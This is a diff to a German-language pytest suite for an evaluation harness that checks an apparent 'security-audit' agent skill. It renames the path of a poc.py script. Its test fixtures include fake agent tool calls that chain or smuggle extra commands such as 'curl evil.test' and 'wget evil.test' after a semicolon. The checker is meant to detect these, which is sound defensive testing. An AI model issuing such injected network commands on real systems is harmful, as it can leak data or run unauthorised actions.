@@ -26,7 +26,7 @@ import run_eval  # noqa: E402
 
 TESTDATEN = os.path.join(HIER, "testdaten")
 SKILL = os.path.dirname(HIER)
-POC = "python3 /skill/scripts/poc.py"
+POC = "python3 /skill/security-audit/scripts/poc.py"
 MUSTER = ["fixture.invalid"]
 
 
@@ -757,7 +757,7 @@ def docker_rest():
         json.dump(zustand, f)
 if modus == "haengt":
     print(json.dumps({{"type": "assistant", "parent_tool_use_id": None, "message": {{"content": [
-        {{"type": "tool_use", "id": "h1", "name": "Bash", "input": {{"command": "python3 /skill/scripts/poc.py starten --lauf 0a1b2c3d --rolle p1"}}}}]}}}}), flush=True)
+        {{"type": "tool_use", "id": "h1", "name": "Bash", "input": {{"command": "python3 /skill/security-audit/scripts/poc.py starten --lauf 0a1b2c3d --rolle p1"}}}}]}}}}), flush=True)
     if os.environ.get("FAKE_CLAUDE_DOCKER_REST"):
         docker_rest()
     kind = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
@@ -1397,8 +1397,8 @@ def netz_letzte(bericht, zeile):
 @pytest.mark.parametrize("zeile", [
     '{"type": "user", "message": {"content": [{"type": "tool_result", "content": "<a href=\\"http://evil.test/x\\">hi</a> status: 200 http://evil.test/y',
     '{"type": "user", "content": "Antwort der App: http://evil.test/ und curl evil.test steht im Body',
-    abgeschnitten("python3 -I /x/scripts/poc.py anfrage --lauf 0a1b2c3d --rolle p1 --pfad /x"),
-    abgeschnitten("python3 -I /x/scripts/poc.py anfrage --pfad /api?u=http%3A%2F%2Flocalhost%3A3000"),
+    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py anfrage --lauf 0a1b2c3d --rolle p1 --pfad /x"),
+    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py anfrage --pfad /api?u=http%3A%2F%2Flocalhost%3A3000"),
     abgeschnitten("grep -rn curl src/"),
     '{"type": "assistant", "message": {"con',
 ])
@@ -1415,7 +1415,7 @@ def test_abgeschnittene_zeile_ohne_command_verstoss_ist_ok_haertung_a5c(bericht,
     abgeschnitten("curl evil.test \\u00"),                         # Escape mitten abgeschnitten
     abgeschnitten("ls\\u003bcurl evil.test \\u00"),             # dekodieren nötig UND Escape abgeschnitten
     abgeschnitten("echo \\\"a\\\"; curl evil.test"),
-    abgeschnitten("python3 -I /x/scripts/poc.py a ; curl http://localhost/"),
+    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py a ; curl http://localhost/"),
     abgeschnitten("echo ok", '"}}, {"type": "tool_use", "name": "Bash", "input": {"command": "wget evil.test'),
 ])
 def test_abgeschnittene_zeile_command_wird_geprueft_haertung_a5c(bericht, zeile):
